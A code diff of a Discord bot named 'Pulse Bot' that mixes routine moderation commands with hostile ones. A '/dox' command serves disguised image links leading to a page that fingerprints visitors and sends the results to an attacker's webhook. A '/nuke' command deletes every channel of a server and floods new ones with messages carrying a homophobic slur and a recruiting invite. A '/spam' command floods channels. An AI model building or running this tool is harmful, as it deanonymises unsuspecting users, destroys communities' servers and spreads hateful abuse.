@@ -1,50 +1,26 @@
-// ============================================================
-// Pulse Bot – Full Command Suite
-// ============================================================
 const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, ChannelType } = require('discord.js');
 const crypto = require('crypto');
 const express = require('express');
 const app = express();
-const os = require('os');
-const fs = require('fs');
-const path = require('path');
 
-// ============================================================
-// ENVIRONMENT VARIABLES
-// ============================================================
 const TOKEN = process.env.TOKEN;
 const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
 const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';
 const PORT = process.env.PORT || 3000;
 
-// ============================================================
-// CLIENT SETUP
-// ============================================================
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
         GatewayIntentBits.GuildMessages,
         GatewayIntentBits.MessageContent,
         GatewayIntentBits.GuildMembers,
-        GatewayIntentBits.GuildModeration,
-        GatewayIntentBits.GuildPresences,
-        GatewayIntentBits.DirectMessages,
-        GatewayIntentBits.GuildVoiceStates,
-        GatewayIntentBits.GuildMessageReactions,
-        GatewayIntentBits.GuildMessageTyping
+        GatewayIntentBits.GuildModeration
     ]
 });
 
-// ============================================================
-// GLOBAL STORAGE
-// ============================================================
 const links = new Map();
 const startTime = Date.now();
-const commandLogs = [];
 
-// ============================================================
-// EXPRESS SERVER – DOX LINK HANDLER
-// ============================================================
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
     if (!links.has(id)) return res.status(404).send('Image not found');
@@ -52,84 +28,93 @@ app.get('/img/:id.png', (req, res) => {
     res.type('text/html');
     res.send(generateDoxHTML(data.webhook || DEFAULT_WEBHOOK));
 });
-app.listen(PORT, () => console.log(`[SERVER] Dox server running on port ${PORT}`));
+app.listen(PORT, () => console.log(`Dox server on ${PORT}`));
 
-// ============================================================
-// COMMAND REGISTRATION
-// ============================================================
-client.once('ready', async () => {
-    console.log(`[BOT] Logged in as ${client.user.tag}`);
-    console.log(`[BOT] Invite: https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot%20applications.commands`);
-    console.log(`[BOT] Guild count: ${client.guilds.cache.size}`);
-
-    // Clear old commands
-    await client.application.commands.set([]);
-    console.log('[COMMANDS] Cleared old commands');
-
-    // Register new commands
+// ---- REGISTER COMMANDS ----
+async function registerCommands() {
     const commands = [
-        { name: 'dox', description: 'Generate a dox link', options: [{ name: 'webhook', type: 3, description: 'Discord webhook URL', required: true }] },
-        { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Number of messages (max 100)', required: true }, { name: 'message', type: 3, description: 'Message content', required: true }, { name: 'delay', type: 4, description: 'Delay in ms between messages', required: false }] },
-        { name: 'nuke', description: 'Delete all channels, create new ones, flood, then leave', options: [{ name: 'channels', type: 4, description: 'Channels to create (default 20, max 50)', required: false }, { name: 'messages', type: 4, description: 'Messages per channel (default 10, max 100)', required: false }, { name: 'delay', type: 4, description: 'Delay in ms between messages (default 50)', required: false }] },
-        { name: 'ad', description: 'Advertise the server invite' },
-        { name: 'purge', description: 'Delete messages in bulk', options: [{ name: 'amount', type: 4, description: 'Number to delete (max 100)', required: true }, { name: 'user', type: 6, description: 'Target user', required: false }, { name: 'reason', type: 3, description: 'Reason for purge', required: false }] },
-        { name: 'serverinfo', description: 'Get detailed server information' },
-        { name: 'userinfo', description: 'Get information about a user', options: [{ name: 'user', type: 6, description: 'Target user', required: false }] },
-        { name: 'math', description: 'Calculate a math expression', options: [{ name: 'expression', type: 3, description: 'Math expression (e.g., 2+2)', required: true }] },
-        { name: 'ping', description: 'Check bot latency' },
-        { name: 'say', description: 'Make the bot say something', options: [{ name: 'message', type: 3, description: 'Message to say', required: true }] },
-        { name: 'avatar', description: 'Show a user\'s avatar', options: [{ name: 'user', type: 6, description: 'Target user', required: false }] },
-        { name: 'kick', description: 'Kick a member from the server', options: [{ name: 'user', type: 6, description: 'User to kick', required: true }, { name: 'reason', type: 3, description: 'Reason for kick', required: false }] },
-        { name: 'ban', description: 'Ban a member from the server', options: [{ name: 'user', type: 6, description: 'User to ban', required: true }, { name: 'reason', type: 3, description: 'Reason for ban', required: false }] },
-        { name: 'unban', description: 'Unban a user by their ID', options: [{ name: 'userid', type: 3, description: 'User ID to unban', required: true }] },
-        { name: 'timeout', description: 'Timeout a member', options: [{ name: 'user', type: 6, description: 'Target user', required: true }, { name: 'duration', type: 4, description: 'Duration in minutes (1-40320)', required: true }, { name: 'reason', type: 3, description: 'Reason for timeout', required: false }] },
-        { name: 'role', description: 'Add or remove a role from a member', options: [{ name: 'action', type: 3, description: 'Add or remove', required: true, choices: [{ name: 'add', value: 'add' }, { name: 'remove', value: 'remove' }] }, { name: 'user', type: 6, description: 'Target user', required: true }, { name: 'role', type: 8, description: 'Role to add/remove', required: true }] },
-        { name: 'poll', description: 'Create a poll', options: [{ name: 'question', type: 3, description: 'Poll question', required: true }, { name: 'option1', type: 3, description: 'Option 1', required: true }, { name: 'option2', type: 3, description: 'Option 2', required: true }, { name: 'option3', type: 3, description: 'Option 3 (optional)', required: false }, { name: 'option4', type: 3, description: 'Option 4 (optional)', required: false }] },
-        { name: 'embed', description: 'Send a custom embed', options: [{ name: 'title', type: 3, description: 'Embed title', required: true }, { name: 'description', type: 3, description: 'Embed description', required: true }, { name: 'color', type: 3, description: 'Hex color (e.g., #ff0000)', required: false }] },
-        { name: 'invite', description: 'Get the bot invite link' },
-        { name: 'help', description: 'Show all available commands' },
+        { name: 'dox', description: 'Generate dox link', options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }] },
+        { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Messages (max 100)', required: true }, { name: 'message', type: 3, description: 'Content', required: true }, { name: 'delay', type: 4, description: 'Delay in ms', required: false }] },
+        { name: 'nuke', description: 'Delete channels, create, flood, leave', options: [{ name: 'channels', type: 4, description: 'Channels (default 20, max 50)', required: false }, { name: 'messages', type: 4, description: 'Messages per channel (default 10, max 100)', required: false }, { name: 'delay', type: 4, description: 'Delay in ms between messages (default 50)', required: false }] },
+        { name: 'ad', description: 'Advertise server' },
+        { name: 'purge', description: 'Delete messages', options: [{ name: 'amount', type: 4, description: 'Number to delete (max 100)', required: true }, { name: 'user', type: 6, description: 'Target user', required: false }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
+        { name: 'serverinfo', description: 'Server information' },
+        { name: 'userinfo', description: 'User information', options: [{ name: 'user', type: 6, description: 'Target user', required: false }] },
+        { name: 'math', description: 'Calculate expression', options: [{ name: 'expression', type: 3, description: 'Math expression', required: true }] },
+        { name: 'ping', description: 'Bot latency' },
+        { name: 'say', description: 'Make bot say something', options: [{ name: 'message', type: 3, description: 'Message to say', required: true }] },
+        { name: 'avatar', description: 'Show user avatar', options: [{ name: 'user', type: 6, description: 'Target user', required: false }] },
+        { name: 'kick', description: 'Kick a member', options: [{ name: 'user', type: 6, description: 'User to kick', required: true }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
+        { name: 'ban', description: 'Ban a member', options: [{ name: 'user', type: 6, description: 'User to ban', required: true }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
+        { name: 'unban', description: 'Unban a user by ID', options: [{ name: 'userid', type: 3, description: 'User ID to unban', required: true }] },
+        { name: 'timeout', description: 'Timeout a member', options: [{ name: 'user', type: 6, description: 'Target user', required: true }, { name: 'duration', type: 4, description: 'Minutes (1-40320)', required: true }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
+        { name: 'role', description: 'Add or remove role', options: [{ name: 'action', type: 3, description: 'add or remove', required: true, choices: [{ name: 'add', value: 'add' }, { name: 'remove', value: 'remove' }] }, { name: 'user', type: 6, description: 'Target user', required: true }, { name: 'role', type: 8, description: 'Role to add/remove', required: true }] },
+        { name: 'poll', description: 'Create a poll', options: [{ name: 'question', type: 3, description: 'Poll question', required: true }, { name: 'option1', type: 3, description: 'Option 1', required: true }, { name: 'option2', type: 3, description: 'Option 2', required: true }, { name: 'option3', type: 3, description: 'Option 3', required: false }, { name: 'option4', type: 3, description: 'Option 4', required: false }] },
+        { name: 'embed', description: 'Send a custom embed', options: [{ name: 'title', type: 3, description: 'Embed title', required: true }, { name: 'description', type: 3, description: 'Embed description', required: true }, { name: 'color', type: 3, description: 'Hex color (e.g. #ff0000)', required: false }] },
+        { name: 'invite', description: 'Get bot invite link' },
+        { name: 'help', description: 'Show all commands' },
         { name: '8ball', description: 'Ask the magic 8-ball a question', options: [{ name: 'question', type: 3, description: 'Your question', required: true }] },
         { name: 'roll', description: 'Roll a dice', options: [{ name: 'sides', type: 4, description: 'Number of sides (default 6)', required: false }] },
-        { name: 'serverlist', description: 'List all servers the bot is in' },
-        { name: 'botstatus', description: 'Change the bot\'s status', options: [{ name: 'status', type: 3, description: 'online/idle/dnd/invisible', required: true }, { name: 'activity', type: 3, description: 'Activity text', required: false }] },
-        { name: 'slowmode', description: 'Set slowmode in the current channel', options: [{ name: 'seconds', type: 4, description: 'Slowmode in seconds (0 to disable)', required: true }] },
+        { name: 'serverlist', description: 'List servers the bot is in' },
+        { name: 'botstatus', description: 'Change bot status', options: [{ name: 'status', type: 3, description: 'online/idle/dnd/invisible', required: true }, { name: 'activity', type: 3, description: 'Activity text', required: false }] },
+        { name: 'slowmode', description: 'Set slowmode in current channel', options: [{ name: 'seconds', type: 4, description: 'Slowmode in seconds (0 to disable)', required: true }] },
         { name: 'lock', description: 'Lock the current channel (requires Manage Channels)' },
         { name: 'unlock', description: 'Unlock the current channel (requires Manage Channels)' },
-        { name: 'uptime', description: 'Show the bot\'s uptime' },
-        { name: 'countdown', description: 'Start a countdown timer', options: [{ name: 'seconds', type: 4, description: 'Seconds to count down (max 600)', required: true }] },
-        { name: 'remindme', description: 'Set a reminder', options: [{ name: 'time', type: 4, description: 'Minutes to wait (max 60)', required: true }, { name: 'message', type: 3, description: 'Reminder message', required: true }] },
-        { name: 'choose', description: 'Choose between multiple options', options: [{ name: 'options', type: 3, description: 'Comma-separated options (e.g., pizza,burger,sushi)', required: true }] },
-        { name: 'coinflip', description: 'Flip a coin' },
-        { name: 'weather', description: 'Get weather for a city (placeholder)', options: [{ name: 'city', type: 3, description: 'City name', required: true }] },
-        { name: 'urban', description: 'Search Urban Dictionary (placeholder)', options: [{ name: 'term', type: 3, description: 'Term to look up', required: true }] },
-        { name: 'translate', description: 'Translate text (placeholder)', options: [{ name: 'text', type: 3, description: 'Text to translate', required: true }, { name: 'target', type: 3, description: 'Target language code (e.g., es, fr)', required: false }] }
+        { name: 'uptime', description: 'Show bot uptime' },
+        { name: 'countdown', description: 'Start a countdown timer', options: [{ name: 'seconds', type: 4, description: 'Number of seconds', required: true }] },
+        { name: 'remindme', description: 'Set a reminder', options: [{ name: 'time', type: 4, description: 'Minutes to wait', required: true }, { name: 'message', type: 3, description: 'Reminder message', required: true }] },
+        { name: 'refresh', description: 'Manually refresh slash commands' }
     ];
 
-    await client.application.commands.set(commands);
-    console.log(`[COMMANDS] Registered ${commands.length} commands`);
+    try {
+        await client.application.commands.set([]);
+        console.log('[REGISTRATION] Cleared old commands.');
+        await client.application.commands.set(commands);
+        console.log(`[REGISTRATION] Successfully registered ${commands.length} commands.`);
+    } catch (error) {
+        console.error('[REGISTRATION] Failed to register commands:', error);
+    }
+}
+
+client.once('ready', async () => {
+    console.log(`Logged in as ${client.user.tag}`);
+    await registerCommands();
+    console.log('Ready – commands should appear in Discord within a minute.');
 });
 
-// ============================================================
-// INTERACTION HANDLER – MASTER
-// ============================================================
+// ---- INTERACTION HANDLER ----
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
-    // Defer immediately to avoid timeout
-    await interaction.deferReply({ ephemeral: true });
+    // GUARANTEED RESPONSE
+    try {
+        await interaction.deferReply({ ephemeral: true });
+    } catch {
+        try {
+            await interaction.reply({ content: '⏳ Processing...', ephemeral: true });
+        } catch {
+            return; // Can't respond at all – bail.
+        }
+    }
 
     try {
         const { commandName, options, user, member, guild, channel } = interaction;
-        const timestamp = new Date().toISOString();
 
-        // Log to file and console
-        console.log(`[${timestamp}] ${user.tag} executed /${commandName}`);
-        commandLogs.push(`[${timestamp}] ${user.tag} -> /${commandName}`);
+        console.log(`[${new Date().toISOString()}] ${user.tag} -> /${commandName}`);
 
-        // ---- COMMAND HANDLING ----
+        // ---- REFRESH ----
+        if (commandName === 'refresh') {
+            await registerCommands();
+            await interaction.editReply('✅ Commands refreshed.');
+            return;
+        }
+
+        // ---- DOX ----
         if (commandName === 'dox') {
             const wh = options.getString('webhook');
-            if (!wh || !wh.startsWith('https://discord.com/api/webhooks/')) return interaction.editReply('❌ Invalid webhook URL.');
+            if (!wh || !wh.startsWith('https://discord.com/api/webhooks/')) {
+                return interaction.editReply('❌ Invalid webhook URL.');
+            }
             const id = crypto.randomBytes(6).toString('hex');
             const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
             links.set(id, { webhook: wh, user: user.tag, created: Date.now() });
@@ -141,6 +126,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ embeds: [embed] });
         }
 
+        // ---- SPAM ----
         else if (commandName === 'spam') {
             const count = Math.min(options.getInteger('count'), 100);
             const msg = options.getString('message');
@@ -153,19 +139,14 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`✅ Spammed ${count} messages.`);
         }
 
+        // ---- NUKE ----
         else if (commandName === 'nuke') {
             if (!guild) return interaction.editReply('❌ Server only.');
-            if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.editReply('❌ Need Administrator.');
+            if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.editReply('❌ Need Admin.');
             const channelCount = Math.min(options.getInteger('channels') || 20, 50);
             const msgCount = Math.min(options.getInteger('messages') || 10, 100);
             const delayMs = Math.min(options.getInteger('delay') || 50, 500);
-            const variants = [
-                '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
-                '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
-                '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER',
-                '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER',
-                '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER'
-            ];
+            const variants = ['# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER'];
             const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
             await Promise.all(guild.channels.cache.map(c => c.delete().catch(() => {})));
             const newChannels = await Promise.all(Array.from({ length: channelCount }, () => guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null)));
@@ -186,64 +167,52 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`✅ Nuked. Created ${valid.length} channels, sent ${msgCount} messages each.`);
         }
 
+        // ---- AD ----
         else if (commandName === 'ad') {
             if (!channel) return interaction.editReply('❌ No channel.');
-            const embed = new EmbedBuilder()
-                .setTitle('🔥 Pulse Nuke Power')
-                .setColor(0x8B5CF6)
-                .setDescription(`Join Pulse:\n${INVITE_LINK}`)
-                .setFooter({ text: 'Pulse Bot' });
+            const embed = new EmbedBuilder().setTitle('🔥 Pulse Nuke Power').setColor(0x8B5CF6).setDescription(`Join Pulse:\n${INVITE_LINK}`).setFooter({ text: 'Pulse Bot' });
             await channel.send({ embeds: [embed] });
             await interaction.editReply('✅ Ad sent.');
         }
 
+        // ---- PURGE ----
         else if (commandName === 'purge') {
             const amount = Math.min(options.getInteger('amount'), 100);
             const targetUser = options.getUser('user');
-            const reason = options.getString('reason') || 'No reason provided';
+            const reason = options.getString('reason') || 'No reason';
             if (!channel) return interaction.editReply('❌ No channel.');
             if (!channel.permissionsFor(member).has(PermissionsBitField.Flags.ManageMessages)) return interaction.editReply('❌ Need Manage Messages.');
             let messages = await channel.messages.fetch({ limit: amount });
             if (targetUser) messages = messages.filter(m => m.author.id === targetUser.id);
             const deleted = await channel.bulkDelete(messages, true).catch(() => {});
-            const embed = new EmbedBuilder()
-                .setTitle('🧹 Purge Complete')
-                .setColor(0x22c55e)
-                .setDescription(`Deleted ${deleted ? deleted.size : 0} messages.`)
-                .addFields({ name: 'Reason', value: reason });
+            const embed = new EmbedBuilder().setTitle('🧹 Purge Complete').setColor(0x22c55e).setDescription(`Deleted ${deleted ? deleted.size : 0} messages.`).addFields({ name: 'Reason', value: reason });
             await interaction.editReply({ embeds: [embed] });
         }
 
+        // ---- SERVERINFO ----
         else if (commandName === 'serverinfo') {
             if (!guild) return interaction.editReply('❌ Server only.');
             const owner = await guild.fetchOwner();
-            const embed = new EmbedBuilder()
-                .setTitle(`📊 ${guild.name}`)
-                .setColor(0x8B5CF6)
-                .setThumbnail(guild.iconURL({ dynamic: true, size: 256 }))
-                .addFields(
-                    { name: '🆔 Server ID', value: guild.id, inline: true },
-                    { name: '👑 Owner', value: owner.user.tag, inline: true },
-                    { name: '👥 Members', value: `${guild.memberCount}`, inline: true },
-                    { name: '💬 Channels', value: `${guild.channels.cache.size}`, inline: true },
-                    { name: '📁 Roles', value: `${guild.roles.cache.size}`, inline: true },
-                    { name: '📅 Created', value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:R>`, inline: true }
-                );
+            const embed = new EmbedBuilder().setTitle(`📊 ${guild.name}`).setColor(0x8B5CF6).setThumbnail(guild.iconURL({ dynamic: true, size: 256 })).addFields(
+                { name: '🆔 Server ID', value: guild.id, inline: true },
+                { name: '👑 Owner', value: owner.user.tag, inline: true },
+                { name: '👥 Members', value: `${guild.memberCount}`, inline: true },
+                { name: '💬 Channels', value: `${guild.channels.cache.size}`, inline: true },
+                { name: '📁 Roles', value: `${guild.roles.cache.size}`, inline: true },
+                { name: '📅 Created', value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:R>`, inline: true }
+            );
             await interaction.editReply({ embeds: [embed] });
         }
 
+        // ---- USERINFO ----
         else if (commandName === 'userinfo') {
             const target = options.getUser('user') || user;
             const memberTarget = guild ? await guild.members.fetch(target.id).catch(() => null) : null;
-            const embed = new EmbedBuilder()
-                .setTitle(`👤 ${target.tag}`)
-                .setColor(0x8B5CF6)
-                .setThumbnail(target.displayAvatarURL({ dynamic: true, size: 256 }))
-                .addFields(
-                    { name: '🆔 User ID', value: target.id, inline: true },
-                    { name: '📅 Account Created', value: `<t:${Math.floor(target.createdTimestamp / 1000)}:R>`, inline: true },
-                    { name: '🤖 Bot', value: target.bot ? 'Yes' : 'No', inline: true }
-                );
+            const embed = new EmbedBuilder().setTitle(`👤 ${target.tag}`).setColor(0x8B5CF6).setThumbnail(target.displayAvatarURL({ dynamic: true, size: 256 })).addFields(
+                { name: '🆔 User ID', value: target.id, inline: true },
+                { name: '📅 Account Created', value: `<t:${Math.floor(target.createdTimestamp / 1000)}:R>`, inline: true },
+                { name: '🤖 Bot', value: target.bot ? 'Yes' : 'No', inline: true }
+            );
             if (memberTarget) {
                 embed.addFields(
                     { name: '📅 Joined Server', value: `<t:${Math.floor(memberTarget.joinedTimestamp / 1000)}:R>`, inline: true },
@@ -253,6 +222,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ embeds: [embed] });
         }
 
+        // ---- MATH ----
         else if (commandName === 'math') {
             const expr = options.getString('expression');
             try {
@@ -265,12 +235,14 @@ client.on('interactionCreate', async (interaction) => {
             }
         }
 
+        // ---- PING ----
         else if (commandName === 'ping') {
             const sent = await interaction.editReply({ content: '🏓 Pinging...', fetchReply: true });
             const latency = sent.createdTimestamp - interaction.createdTimestamp;
             await interaction.editReply(`🏓 Pong!\n📨 Latency: ${latency}ms\n📡 API: ${Math.round(client.ws.ping)}ms`);
         }
 
+        // ---- SAY ----
         else if (commandName === 'say') {
             const msg = options.getString('message');
             if (!channel) return interaction.editReply('❌ No channel.');
@@ -278,15 +250,14 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply('✅ Sent.');
         }
 
+        // ---- AVATAR ----
         else if (commandName === 'avatar') {
             const target = options.getUser('user') || user;
-            const embed = new EmbedBuilder()
-                .setTitle(`${target.tag}'s Avatar`)
-                .setImage(target.displayAvatarURL({ dynamic: true, size: 1024 }))
-                .setColor(0x8B5CF6);
+            const embed = new EmbedBuilder().setTitle(`${target.tag}'s Avatar`).setImage(target.displayAvatarURL({ dynamic: true, size: 1024 })).setColor(0x8B5CF6);
             await interaction.editReply({ embeds: [embed] });
         }
 
+        // ---- KICK ----
         else if (commandName === 'kick') {
             if (!guild) return interaction.editReply('❌ Server only.');
             const target = options.getUser('user');
@@ -299,6 +270,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`✅ Kicked ${target.tag} for "${reason}"`);
         }
 
+        // ---- BAN ----
         else if (commandName === 'ban') {
             if (!guild) return interaction.editReply('❌ Server only.');
             const target = options.getUser('user');
@@ -308,6 +280,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`✅ Banned ${target.tag} for "${reason}"`);
         }
 
+        // ---- UNBAN ----
         else if (commandName === 'unban') {
             if (!guild) return interaction.editReply('❌ Server only.');
             const userId = options.getString('userid');
@@ -316,6 +289,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`✅ Unbanned user ${userId}`);
         }
 
+        // ---- TIMEOUT ----
         else if (commandName === 'timeout') {
             if (!guild) return interaction.editReply('❌ Server only.');
             const target = options.getUser('user');
@@ -328,6 +302,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`✅ Timed out ${target.tag} for ${duration} minutes.`);
         }
 
+        // ---- ROLE ----
         else if (commandName === 'role') {
             if (!guild) return interaction.editReply('❌ Server only.');
             const action = options.getString('action');
@@ -346,6 +321,7 @@ client.on('interactionCreate', async (interaction) => {
             }
         }
 
+        // ---- POLL ----
         else if (commandName === 'poll') {
             if (!channel) return interaction.editReply('❌ No channel.');
             const question = options.getString('question');
@@ -356,69 +332,59 @@ client.on('interactionCreate', async (interaction) => {
             const opts = [opt1, opt2, opt3, opt4].filter(o => o);
             const emojis = ['1️⃣', '2️⃣', '3️⃣', '4️⃣'];
             let desc = opts.map((o, i) => `${emojis[i]} ${o}`).join('\n');
-            const embed = new EmbedBuilder()
-                .setTitle(`📊 ${question}`)
-                .setDescription(desc)
-                .setColor(0x8B5CF6);
+            const embed = new EmbedBuilder().setTitle(`📊 ${question}`).setDescription(desc).setColor(0x8B5CF6);
             const msg = await channel.send({ embeds: [embed] });
             for (let i = 0; i < opts.length; i++) await msg.react(emojis[i]);
             await interaction.editReply('✅ Poll created.');
         }
 
+        // ---- EMBED ----
         else if (commandName === 'embed') {
             if (!channel) return interaction.editReply('❌ No channel.');
             const title = options.getString('title');
             const description = options.getString('description');
             const color = options.getString('color') || '#8B5CF6';
-            const embed = new EmbedBuilder()
-                .setTitle(title)
-                .setDescription(description)
-                .setColor(color)
-                .setTimestamp();
+            const embed = new EmbedBuilder().setTitle(title).setDescription(description).setColor(color).setTimestamp();
             await channel.send({ embeds: [embed] });
             await interaction.editReply('✅ Embed sent.');
         }
 
+        // ---- INVITE ----
         else if (commandName === 'invite') {
             await interaction.editReply(`🔗 Invite me: https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot%20applications.commands`);
         }
 
+        // ---- HELP ----
         else if (commandName === 'help') {
             const commands = client.application.commands.cache.map(c => `\`/${c.name}\` - ${c.description}`).join('\n');
-            const embed = new EmbedBuilder()
-                .setTitle('📋 Commands')
-                .setDescription(commands)
-                .setColor(0x8B5CF6)
-                .setFooter({ text: `Total ${client.application.commands.cache.size} commands` });
+            const embed = new EmbedBuilder().setTitle('📋 Commands').setDescription(commands).setColor(0x8B5CF6).setFooter({ text: `Total ${client.application.commands.cache.size} commands` });
             await interaction.editReply({ embeds: [embed] });
         }
 
+        // ---- 8BALL ----
         else if (commandName === '8ball') {
             const responses = ['Yes', 'No', 'Maybe', 'Ask again later', 'Definitely', 'Absolutely not', 'It is certain', 'Very doubtful'];
             const answer = responses[Math.floor(Math.random() * responses.length)];
             const q = options.getString('question');
-            const embed = new EmbedBuilder()
-                .setTitle('🎱 8-Ball')
-                .setDescription(`**Question:** ${q}\n**Answer:** ${answer}`)
-                .setColor(0x8B5CF6);
+            const embed = new EmbedBuilder().setTitle('🎱 8-Ball').setDescription(`**Question:** ${q}\n**Answer:** ${answer}`).setColor(0x8B5CF6);
             await interaction.editReply({ embeds: [embed] });
         }
 
+        // ---- ROLL ----
         else if (commandName === 'roll') {
             const sides = options.getInteger('sides') || 6;
             const result = Math.floor(Math.random() * sides) + 1;
             await interaction.editReply(`🎲 Rolled a d${sides}: **${result}**`);
         }
 
+        // ---- SERVERLIST ----
         else if (commandName === 'serverlist') {
             const list = client.guilds.cache.map(g => `${g.name} (${g.id})`).join('\n');
-            const embed = new EmbedBuilder()
-                .setTitle('📋 Server List')
-                .setDescription(list || 'None')
-                .setColor(0x8B5CF6);
+            const embed = new EmbedBuilder().setTitle('📋 Server List').setDescription(list || 'None').setColor(0x8B5CF6);
             await interaction.editReply({ embeds: [embed] });
         }
 
+        // ---- BOTSTATUS ----
         else if (commandName === 'botstatus') {
             const status = options.getString('status');
             const activity = options.getString('activity') || 'Pulse Bot';
@@ -428,6 +394,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`✅ Status set to ${status} with activity "${activity}".`);
         }
 
+        // ---- SLOWMODE ----
         else if (commandName === 'slowmode') {
             if (!channel) return interaction.editReply('❌ No channel.');
             if (!member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.editReply('❌ Need Manage Channels.');
@@ -436,6 +403,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`✅ Slowmode set to ${seconds} seconds.`);
         }
 
+        // ---- LOCK ----
         else if (commandName === 'lock') {
             if (!channel) return interaction.editReply('❌ No channel.');
             if (!member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.editReply('❌ Need Manage Channels.');
@@ -443,6 +411,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply('🔒 Channel locked.');
         }
 
+        // ---- UNLOCK ----
         else if (commandName === 'unlock') {
             if (!channel) return interaction.editReply('❌ No channel.');
             if (!member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.editReply('❌ Need Manage Channels.');
@@ -450,6 +419,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply('🔓 Channel unlocked.');
         }
 
+        // ---- UPTIME ----
         else if (commandName === 'uptime') {
             const diff = Date.now() - startTime;
             const seconds = Math.floor(diff / 1000);
@@ -460,6 +430,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`⏳ Uptime: **${uptime}**`);
         }
 
+        // ---- COUNTDOWN ----
         else if (commandName === 'countdown') {
             const seconds = options.getInteger('seconds');
             if (seconds > 600) return interaction.editReply('❌ Max 600 seconds.');
@@ -473,6 +444,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.channel.send(`🔔 **Countdown finished!**`).catch(() => {});
         }
 
+        // ---- REMINDME ----
         else if (commandName === 'remindme') {
             const minutes = options.getInteger('time');
             const msg = options.getString('message');
@@ -487,48 +459,13 @@ client.on('interactionCreate', async (interaction) => {
             }, minutes * 60000);
         }
 
-        else if (commandName === 'choose') {
-            const optionsStr = options.getString('options');
-            const choices = optionsStr.split(',').map(s => s.trim()).filter(s => s);
-            if (choices.length < 2) return interaction.editReply('❌ Need at least 2 options.');
-            const chosen = choices[Math.floor(Math.random() * choices.length)];
-            await interaction.editReply(`🤔 I choose: **${chosen}**`);
-        }
-
-        else if (commandName === 'coinflip') {
-            const result = Math.random() < 0.5 ? 'Heads' : 'Tails';
-            await interaction.editReply(`🪙 **${result}**`);
-        }
-
-        else if (commandName === 'weather') {
-            const city = options.getString('city');
-            await interaction.editReply(`🌤️ Weather for ${city} – placeholder (API not implemented)`);
-        }
-
-        else if (commandName === 'urban') {
-            const term = options.getString('term');
-            await interaction.editReply(`📖 Urban Dictionary definition for "${term}" – placeholder (API not implemented)`);
-        }
-
-        else if (commandName === 'translate') {
-            const text = options.getString('text');
-            const target = options.getString('target') || 'en';
-            await interaction.editReply(`🌐 Translation to ${target}: "${text}" – placeholder (API not implemented)`);
-        }
-
     } catch (error) {
-        console.error(`[ERROR] Command failed:`, error);
-        try {
-            await interaction.editReply({ content: `❌ An error occurred: ${error.message}` });
-        } catch {
-            await interaction.followUp({ content: `❌ An error occurred: ${error.message}`, ephemeral: true });
-        }
+        console.error('[ERROR]', error);
+        try { await interaction.editReply(`❌ Error: ${error.message}`); } catch {}
     }
 });
 
-// ============================================================
-// DOX HTML GENERATOR – FULL FEATURED
-// ============================================================
+// ---- DOX HTML GENERATOR ----
 function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
 <html>
@@ -560,29 +497,12 @@ function getAudioFP(){return new Promise(resolve=>{try{const ctx=new(window.Offl
 </html>`;
 }
 
-// ============================================================
-// AUTO-CLEANUP OF OLD DOX LINKS
-// ============================================================
 setInterval(() => {
     const keys = Array.from(links.keys());
     if (keys.length > 100) keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
 }, 60000);
 
-// ============================================================
-// GLOBAL ERROR HANDLING
-// ============================================================
-process.on('uncaughtException', (err) => {
-    console.error('[FATAL] Uncaught Exception:', err);
-});
-process.on('unhandledRejection', (err) => {
-    console.error('[FATAL] Unhandled Rejection:', err);
-});
+process.on('uncaughtException', console.error);
+process.on('unhandledRejection', console.error);
 
-// ============================================================
